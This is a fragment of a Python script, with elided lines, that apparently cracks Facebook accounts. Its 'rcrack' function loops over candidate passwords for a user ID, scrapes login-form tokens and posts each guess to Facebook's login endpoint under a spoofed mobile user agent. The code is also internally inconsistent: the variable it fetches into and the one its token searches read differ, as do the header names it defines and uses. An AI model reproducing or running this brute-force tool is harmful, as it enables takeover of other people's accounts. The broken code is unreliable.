...
def rcrack(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            m_fb = session.get('https://graph.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(graph_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(graph_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(graph_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(graph_fb)).group(1),
            ...
            header_graphfb = {'authority':'graph.facebook.com',
            ...
            'upgrade-insecure-requests': '1',
             ...
             'user-agent':'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36',}

            lo = session.post('https://graph.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
